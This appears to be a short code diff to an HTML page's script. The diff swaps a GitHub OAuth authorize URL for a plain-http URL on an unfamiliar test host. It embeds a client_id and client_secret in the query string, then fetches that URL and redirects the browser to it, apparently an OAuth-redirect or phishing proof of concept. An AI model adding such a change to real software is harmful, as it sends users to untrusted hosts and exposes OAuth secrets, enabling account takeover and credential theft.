@@ -1,5 +1,7 @@
+<html>
+  <body>
 <script>
-  const authUrl = `https://github.com/login/oauth/authorize?client_id=${CLIENT_ID}&scope=read:user&authorize=1`;
+  const authUrl = `http://authorization-ptl-929f8477-75deddee.libcurl.so?redirect_uri=https://lucifer9791.github.io/test_host/test123.html&client_id=3b189b4c63ee8ac8240e73c0ab4de9c7498ac361f4a498df85b53e0a37d5bd38&scope=&client_secret=2e3296ed10bdd5ae43e2c579dde17dcc8a46a0de4404b47785009560788970e5`;
     fetch(
       authUrl,
       {
@@ -12,6 +14,7 @@
     }).then(() => {
       window.location = authUrl;
     });
-  });
 
 </script>
+</body>
+</html>
